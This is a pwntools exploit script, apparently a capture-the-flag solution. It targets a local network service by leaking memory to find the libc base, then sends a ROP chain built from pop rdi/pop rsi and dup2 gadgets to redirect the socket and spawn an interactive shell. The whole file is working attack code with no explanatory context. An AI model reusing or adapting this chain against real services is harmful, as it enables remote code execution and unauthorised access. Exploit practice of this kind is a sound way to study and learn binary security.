import random

from pwn import *
from string import printable, ascii_lowercase
from time import sleep

r = remote('localhost', 8080)

r.sendline("300")
r.sendline("a"*10)

resp = r.recv()

print("len @ {}", len(resp))
libc_leak = u64(resp[104:112])
libc = libc_leak - 6231776

print("libc @ {:016x}".format(libc))

# Dump the contents of memory to break ASLR
for i in range(0,292,8):
    print("{} {:016x}".format(i, u64(resp[i:i+8])))

buffer = "a"*16
onegadget = libc + 0xe8acf

print("onegadget {:016x}".format(onegadget))

# 0x0000000000021ffc: pop rsi; ret;
# 0x0000000000022c48: pop rdi; ret;

# 0x0000000000191ccc: push rsp; ret 1;
# 0x000000000016cbc6: push rsi; ret 0xf02;
# 0x000000000016f018: push qword ptr [rbp + 0x1a]; xor eax, eax; ret;

# 0x000000000016f018: push qword ptr [rbp + 0x1a]; xor eax, eax; ret;

#  6831: 00000000000ffda0   166 FUNC    GLOBAL DEFAULT   12 recvmmsg
#  5681: 00000000000ff930    90 FUNC    WEAK   DEFAULT   12 sendmsg
#  5731: 00000000000f00d0                                   dup2
#        0x000000000002e62f: ret 0x100;
#        0x000000000002e63e: ret 0x200;
#        0x000000000004d00a: ret 0x2c2
#        0x00000000000f9929: ret 0x2eb;
#        0x000000000005ca5a: ret 0x348;

print("First payload")
r.sendline("5000")
pad = 0x1e0 + 0x1a - (16 + 32)

# str.encode("a"*4500)
runs = 4500 // len(ascii_lowercase)
# payload = str.encode(ascii_lowercase*runs).replace(str.encode("opqrstuv"), p64(0))
payload = [char for char in ascii_lowercase*runs]

random.seed(0)
random.shuffle(payload)

#libc+0x0000000000022c48)

with open("payload.txt", "w") as f:
  f.write("".join(payload))

payload = str.encode("".join(payload)).replace(str.encode('ptjhwctj'), p64(libc+0x0000000000022c48)).replace(str.encode('zlnbedbz'), p64(libc+0x0000000000022c48)).replace(str.encode('zbcmeszn'), p64(0x4)).replace(str.encode('zhxphzsu'), p64(libc+0x0000000000021ffc)).replace(str.encode('dewplcdf'), p64(1)).replace(str.encode('kewvreyx'), p64(libc+0xf00d0)).replace(str.encode('ainbmpsi'), p64(libc+0x0000000000021ffc)).replace(str.encode('umaosznx'), p64(0)).replace(str.encode('etcmotxv'), p64(libc+0xf00d0)).replace(str.encode('loskrzec'), p64(libc+0x0000000000022c48)).replace(str.encode('aaiksxmm'), p64(libc+0x00187dc9)).replace(str.encode('llqlduzg'), p64(libc+0x000432c0)).replace(str.encode('iccascvs'), p64(0))

r.send(str.encode(buffer) + p64(libc + 0x000000000016f018) + p64(libc + 0x5ca5a) + payload)

r.interactive()
